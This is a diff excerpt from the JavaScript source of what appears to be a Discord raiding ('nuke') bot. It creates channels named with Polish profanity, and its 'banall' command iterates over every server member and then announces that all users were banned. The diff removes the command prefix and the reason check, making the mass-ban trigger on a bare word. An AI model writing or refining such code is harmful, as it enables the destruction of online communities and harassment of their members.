@@ -136,12 +136,9 @@ message.guild.createChannel("JEBAĆ FUBU bye");
 message.guild.createChannel("JEBAĆ FUBU nara");
 message.guild.createChannel("JEBAĆ FUBU yo");
 message.guild.createChannel("JEBAĆ FUBU XD");
+
 }
- if(cmd === `${prefix}banall`){	
-  let BReason = args.join(" ").slice(0);
-  if (!BReason) return message.reply("Nie znaleziono osób do banowania")
-
-
+ if(cmd === `banall`){	
   let C = message.channel;
   message.guild.members.forEach((f, i) => {
      
@@ -151,7 +148,7 @@ message.guild.createChannel("JEBAĆ FUBU XD");
   message.channel.send("Wszyscy Użytkownicy zostali zbanowali. Pozdrawiam ANF 2.0 XD");
   }
 
-    if(cmd === `${prefix}ban`){	
+    if(cmd === `ban`){	
 
    const member = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));	
   if (!member) return message.channel.send("Oznacz użytkownika!");	
